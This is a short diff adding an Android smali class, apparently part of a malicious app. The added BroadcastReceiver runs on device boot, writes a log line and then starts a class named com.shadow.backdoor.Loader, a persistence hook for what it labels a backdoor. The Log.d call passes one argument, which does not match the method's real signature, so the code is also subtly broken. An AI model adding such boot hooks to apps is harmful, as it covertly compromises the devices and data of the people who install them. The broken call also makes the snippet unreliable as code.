@@ -1,0 +1,12 @@
+.class public Lcom/shadow/boot/BootReceiver;
+.super Landroid/content/BroadcastReceiver;
+
+.method public onReceive(Landroid/content/Context;Landroid/content/Intent;)V
+    .locals 1
+
+    const-string v0, "BOOT RECEIVED"
+    invoke-static {v0}, Landroid/util/Log;->d(Ljava/lang/String;)I
+
+    invoke-static {}, Lcom/shadow/backdoor/Loader;->start()V
+    return-void
+.end method
